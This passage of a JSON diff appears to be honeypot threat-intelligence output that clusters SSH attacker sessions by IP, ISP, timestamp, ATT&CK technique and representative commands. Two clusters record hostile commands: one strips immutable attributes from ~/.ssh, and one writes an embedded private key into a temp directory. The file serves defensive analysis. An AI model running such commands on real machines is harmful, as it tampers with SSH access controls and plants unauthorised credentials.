+          "country": "CN",
+          "isp": "China Unicom Liaoning province network",
+          "command_count": 1,
+          "timestamp": "2026-10-22T02:16:51.045310Z"
+        },
+        {
+          "session_id": "IR-b0e8e569739a",
+          "src_ip": "218.27.202.178",
+          "country": "CN",
+          "isp": "China Unicom Jilin province network",
+          "command_count": 1,
+          "timestamp": "2026-10-22T02:27:24.926777Z"
+        },
+        {
+          "session_id": "IR-79ce72cabc3a",
+          "src_ip": "169.58.33.158",
+          "country": "FR",
+          "isp": "Contabo GmbH",
+          "command_count": 1,
+          "timestamp": "2026-10-22T07:35:27.260065Z"
+        },
+        {
+          "session_id": "IR-32415c023e55",
+          "src_ip": "120.48.53.174",
+          "country": "CN",
+          "isp": "Beijing Baidu Netcom Science and Technology Co., Ltd.",
+          "command_count": 1,
+          "timestamp": "2026-10-22T08:57:50.139758Z"
+        },
+        {
+          "session_id": "IR-e193abc28c52",
+          "src_ip": "43.100.80.234",
+          "country": "HK",
+          "isp": "Alibaba Cloud (Singapore) Private Limited",
+          "command_count": 1,
+          "timestamp": "2026-10-22T12:31:36.332773Z"
+        },
+        {
+          "session_id": "IR-27030c5ee2f7",
+          "src_ip": "142.252.103.21",
+          "country": "US",
+          "isp": "EASY LINK LLC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T12:55:11.611136Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-010",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 7,
+      "unique_ips": [
+        "36.137.180.219",
+        "121.224.78.164",
+        "118.196.118.181",
+        "36.137.249.148",
+        "115.191.32.68"
+      ],
+      "unique_ip_count": 5,
+      "sequence_hash": "c32b4937ce8564ea",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+      ],
+      "members": [
+        {
+          "session_id": "IR-372044307c86",
+          "src_ip": "36.137.249.148",
+          "country": "CN",
+          "isp": "China Mobile Communications Corporation",
+          "command_count": 1,
+          "timestamp": "2026-10-22T02:40:17.724959Z"
+        },
+        {
+          "session_id": "IR-d899f1c37545",
+          "src_ip": "36.137.180.219",
+          "country": "CN",
+          "isp": "China Mobile Communications Corporation",
+          "command_count": 1,
+          "timestamp": "2026-10-22T10:22:43.000001Z"
+        },
+        {
+          "session_id": "IR-0d19080ccf73",
+          "src_ip": "115.191.32.68",
+          "country": "CN",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "command_count": 1,
+          "timestamp": "2026-10-22T11:00:05.433586Z"
+        },
+        {
+          "session_id": "IR-348d5bb40cc3",
+          "src_ip": "121.224.78.164",
+          "country": "CN",
+          "isp": "CHINANET jiangsu province network",
+          "command_count": 1,
+          "timestamp": "2026-10-22T12:22:59.580482Z"
+        },
+        {
+          "session_id": "IR-74bdf04f2e99",
+          "src_ip": "118.196.118.181",
+          "country": "CN",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "command_count": 1,
+          "timestamp": "2026-10-22T14:32:01.902673Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-011",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3,
+      "unique_ips": [
+        "104.199.79.62",
+        "35.195.24.58",
+        "34.79.51.154"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "758d61f26a444483",
+      "ttps": [],
+      "representative_commands": [
+        "PING"
+      ],
+      "members": [
+        {
+          "session_id": "IR-5062d1c07965",
+          "src_ip": "35.195.24.58",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T03:51:32.235355Z"
+        },
+        {
+          "session_id": "IR-6cdcc67d8adb",
+          "src_ip": "34.79.51.154",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T04:16:55.226346Z"
+        },
+        {
+          "session_id": "IR-2661f470fe2e",
+          "src_ip": "104.199.79.62",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-10-22T04:58:42.638282Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-012",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 16,
+      "unique_ips": [
+        "193.112.192.91"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "7063dece7cccf374",
+      "ttps": [],
+      "representative_commands": [
+        "hostname"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c81f63fe1aaa",
+          "src_ip": "193.112.192.91",
+          "country": "CN",
+          "isp": "Tencent Cloud Computing (Beijing) Co., Ltd",
+          "command_count": 1,
+          "timestamp": "2026-10-22T05:09:23.440266Z"
+        },
+        {
+          "session_id": "IR-e6eb65bc872f",
+          "src_ip": "193.112.192.91",
+          "country": "CN",
+          "isp": "Tencent Cloud Computing (Beijing) Co., Ltd",
+          "command_count": 1,
+          "timestamp": "2026-10-22T09:36:23.052284Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-013",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "130.12.180.51"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "ccd29aff2c593ed4",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p"
+      ],
+      "members": [
+        {
+          "session_id": "IR-d6d373d5cb60",
+          "src_ip": "130.12.180.51",
+          "country": "DE",
+          "isp": "Virtualine Technologies",
+          "command_count": 1,
+          "timestamp": "2026-10-22T05:17:50.457797Z"
+        },
+        {
+          "session_id": "IR-55dd489d9eb5",
+          "src_ip": "130.12.180.51",
+          "country": "DE",
+          "isp": "Virtualine Technologies",
+          "command_count": 1,
+          "timestamp": "2026-10-22T06:49:03.049626Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-014",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3585,
+      "unique_ips": [
+        "109.160.32.163",
+        "109.160.32.169",
+        "109.160.32.117"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "7ab552f01de999cb",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -v -n -r -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-ae47896568fb",
+          "src_ip": "109.160.32.117",
+          "country": "DE",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-10-22T09:50:37.431527Z"
+        },
+        {
+          "session_id": "IR-27fa02b6a828",
+          "src_ip": "109.160.32.117",
+          "country": "DE",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-10-22T10:00:04.389727Z"
+        },
+        {
+          "session_id": "IR-89309e961ea7",
+          "src_ip": "109.160.32.163",
+          "country": "DE",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-10-22T10:47:14.863134Z"
+        },
+        {
+          "session_id": "IR-ee03550806ee",
+          "src_ip": "109.160.32.163",
+          "country": "DE",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-10-22T12:00:04.697003Z"
+        },
+        {
+          "session_id": "IR-1c91ff8cb5dd",
+          "src_ip": "109.160.32.169",
+          "country": "DE",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-10-22T12:50:00.391654Z"
+        },
+        {
+          "session_id": "IR-4fa6d1955def",
+          "src_ip": "109.160.32.169",
+          "country": "DE",
+          "isp": "Global Communication Net Plc",
+          "command_count": 1,
+          "timestamp": "2026-10-22T14:00:02.885068Z"
         }
       ]
     }
